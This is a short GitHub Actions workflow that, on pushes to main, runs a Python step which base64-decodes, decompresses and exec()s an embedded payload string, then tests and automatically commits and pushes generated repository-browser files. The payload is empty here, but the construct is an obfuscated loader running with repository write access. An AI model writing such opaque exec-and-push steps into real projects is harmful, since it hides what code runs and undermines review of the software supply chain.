name: P224 Unify repository browser

on:
  push:
    branches: [main]

permissions:
  contents: write

jobs:
  unify:
    if: github.actor != 'github-actions[bot]'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Apply unified repository browser
        shell: bash
        run: |
          python - <<'PY'
          import base64,zlib
          payload=''
          exec(zlib.decompress(base64.b64decode(payload)).decode('utf-8'))
          PY
      - name: Run repository tests
        shell: bash
        run: |
          npm ci
          npm test
      - name: Commit unified repository browser
        shell: bash
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add index.html index.html.sha512 modules/repository.js modules/repository.css
          git diff --cached --check
          git commit -m "P224: unificar navegação do repositório"
          git push
